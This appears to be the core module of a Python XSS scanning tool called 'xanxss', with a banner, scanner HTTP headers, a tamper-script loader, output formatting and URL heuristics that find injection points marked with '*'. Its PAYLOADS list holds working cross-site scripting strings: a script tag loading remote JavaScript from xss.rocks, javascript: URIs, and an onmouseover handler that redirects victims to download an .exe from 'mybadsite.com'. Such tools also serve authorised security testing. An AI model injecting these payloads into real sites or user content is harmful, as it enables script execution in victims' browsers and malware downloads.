import os
import re
import sys
import platform
import importlib


VERSION = "0.4"
BANNER = """\033[95m
    ____  ___             ____  ___  _________ _________  \033[0m\033[96m
    \   \/  /____    ____ \   \/  / /   _____//   _____/
    \033[0m\033[95m \     /\__  \  /    \ \     /  \_____  \ \_____  \ \033[0m\033[96m
     /     \ / __ \|   |  \/     \  /        \/        \\
  \033[0m\033[95m  /___/\  (____  /___|  /___/\  \/_______  /_______  / \033[0m\033[96m
          \_/    \/     \/      \_/        \/        \/ 
    v({})\033[0m\n\n""".format(VERSION)
HEADERS = {
    "Connection": "close",
    "User-Agent": "xanxss/v{} (Language={}; Platform={})".format(
        VERSION, sys.version.split(" ")[0], platform.platform().split(" ")[0]
    )
}
PAYLOADS = [
    "<script src='http://xss.rocks/xss.js'></script>",
    "<img src='javascript:alert(\"XSS\");'>",
    "<script>alert(1);</script>",
    "<b onmouseover=window.location='https://mybadsite.com/download.php?item=pumpedupkicks.exe'>click me!</b>",
    '<iframe src="javascript:prompt(1)">',
    "<xanxss></xanxss>"
]


def load_tampers():
    """
    load the tamper scripts into memory
    """
    script_path = "{}/tamper".format(os.getcwd())
    importter = "tamper.{}"
    skip_schema = ("__init__.py", ".pyc", "__")
    tmp = []
    retval = []
    file_list = [f for f in os.listdir(script_path) if not any(s in f for s in skip_schema)]
    for script in file_list:
        script = script[:-3]
        script = importlib.import_module(importter.format(script))
        tmp.append(script)
    for mod in tmp:
        current_priority = mod.__PRIORITY__
        if current_priority > 10:
            save = mod
        else:
            save = None
            retval.insert(current_priority, mod)
        retval.insert(-1, save)
    return retval


def prettify(working):
    """
    make output beautiful
    """
    seperator = "-" * 50
    print(seperator)
    for item in working:
        print("  ~~> {}".format(item))
    print(seperator)


def heuristics(url):
    query_regex = re.compile(r"(.*)[?|#](.*){1}\=(.*)")
    url_validation = re.compile(
        r'^(?:http|ftp)s?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE
    )
    retval = {}
    if url_validation.match(url):
        retval["validated"] = True
    else:
        retval["validated"] = False
    if query_regex.search(url) is not None:
        retval["query"] = "ok"
    else:
        retval["query"] = "nogo"
    for c in url:
        if c == "*":
            retval["marker"] = "yes"
    if url.count("*") > 1:
        retval["multi_marker"] = True
    return retval
